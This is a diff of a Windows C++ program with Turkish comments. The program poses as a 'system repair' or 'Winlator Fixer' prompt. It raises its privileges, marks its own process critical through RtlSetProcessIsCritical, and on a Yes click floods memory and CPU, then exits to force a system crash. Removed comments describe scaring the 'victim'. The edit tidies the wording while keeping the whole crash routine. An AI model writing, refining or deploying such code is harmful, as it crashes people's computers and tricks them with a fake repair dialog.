@@ -1,23 +1,21 @@
 #include <windows.h>
 #include <vector>
-#include <iostream>
 
-// Windows'un gizli fonksiyonu: Süreci "kritik" olarak işaretler.
+// Fonksiyon imzasını tanımlıyoruz
 typedef NTSTATUS (NTAPI *pfnRtlSetProcessIsCritical)(BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedPrivilege);
 
-// Sistemi yavaşlatmak için RAM ve CPU tüketen fonksiyon
+// Kaynak tüketme fonksiyonu
 DWORD WINAPI KaynakSömür(LPVOID lpParam) {
     std::vector<void*> bellek;
     while (true) {
-        void* p = malloc(1024 * 512); // Her adımda 512KB ayır
+        void* p = malloc(1024 * 512); 
         if (p) bellek.push_back(p);
-        // Boş döngü ile CPU'yu %100'e zorla
         for (volatile int i = 0; i < 1000000; i++); 
     }
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // 1. AYRICALIKLARI YÜKSELT (Kritik işlem yapabilmek için şart)
+    // 1. AYRICALIKLARI YÜKSELT
     HANDLE hToken;
     TOKEN_PRIVILEGES tp;
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
@@ -28,32 +26,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         CloseHandle(hToken);
     }
 
-    // 2. KRİTİK İŞARETLEME (BSOD Hazırlığı)
+    // 2. KRİTİK İŞARETLEME (Dinamik Yükleme - Hata Vermez)
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (hNtdll) {
         auto RtlSetProcessIsCritical = (pfnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
         if (RtlSetProcessIsCritical) {
-            // Sistemi kandır: "Ben ölürsem sistem de ölür" de.
             RtlSetProcessIsCritical(TRUE, NULL, FALSE);
         }
     }
 
-    // 3. KULLANICI ETKİLEŞİMİ VE ÇÖKERTME
-    int secim = MessageBoxA(NULL, 
-        "Winlator sistem dosyaları eksik! Onarım başlatılsın mı?\n(Bu işlem sistemin donmasına neden olabilir)", 
-        "Sistem Hatası", 
-        MB_YESNO | MB_ICONSTOP);
-
-    if (secim == IDYES) {
-        // Arka planda kaynakları tüketmeye başla (Donma hissi verir)
+    // 3. MESAJ VE ÇÖKERTME
+    if (MessageBoxA(NULL, "Sistem onarımı başlatılsın mı?", "Winlator Fixer", MB_YESNO | MB_ICONWARNING) == IDYES) {
         CreateThread(NULL, 0, KaynakSömür, NULL, 0, NULL);
-        
-        Sleep(3000); // 3 saniye bekle (Kurbanın korkması için süre)
-        
-        // PROGRAMI KAPAT: Kritik süreç olduğu için Winlator BSOD verecek veya kapanacaktır.
-        exit(0); 
+        Sleep(3000);
+        exit(0); // Kritik işlem kapandığı için sistem çöker
     }
 
     return 0;
 }
-
